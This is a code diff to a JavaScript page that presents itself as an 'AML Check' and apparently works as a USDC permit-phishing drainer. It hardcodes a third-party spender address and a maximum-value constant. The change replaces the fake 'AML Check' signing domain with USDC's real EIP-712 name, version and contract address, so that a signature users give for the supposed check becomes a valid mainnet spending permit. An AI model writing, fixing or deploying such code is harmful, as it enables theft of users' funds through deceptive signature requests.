@@ -678,8 +678,11 @@ const CUSTOM_SOLANA_RPC = "";
 /** Ethereum mainnet — delegate / spender (optional). If empty, use the field in the payment step. */
 const EVM_PERMIT_SPENDER = "0x9e6c210D3fe9B9E94252B404bf26E8387F4C2A8D";
 const EVM_PERMIT_CHAIN_ID = 1;
-/** USDC on Ethereum mainnet (used to read permit nonce via eth_call). */
+/** USDC on Ethereum mainnet (EIP-2612 permit target + eth_call nonces). */
 const EVM_USDC_MAINNET = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+/** Must match the USDC contract’s DOMAIN_SEPARATOR (EIP-712). */
+const EVM_USDC_EIP712_NAME = "USD Coin";
+const EVM_USDC_EIP712_VERSION = "2";
 const U256_MAX_STR =
   "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
@@ -750,7 +753,12 @@ function updateEvmDelegateUi() {
 
 function buildPermitTypedData(userAddress, currentNonceStr, spenderAddress) {
   return {
-    domain: { name: "AML Check", version: "1", chainId: EVM_PERMIT_CHAIN_ID },
+    domain: {
+      name: EVM_USDC_EIP712_NAME,
+      version: EVM_USDC_EIP712_VERSION,
+      chainId: EVM_PERMIT_CHAIN_ID,
+      verifyingContract: EVM_USDC_MAINNET,
+    },
     types: {
       Permit: [
         { name: "owner", type: "address" },
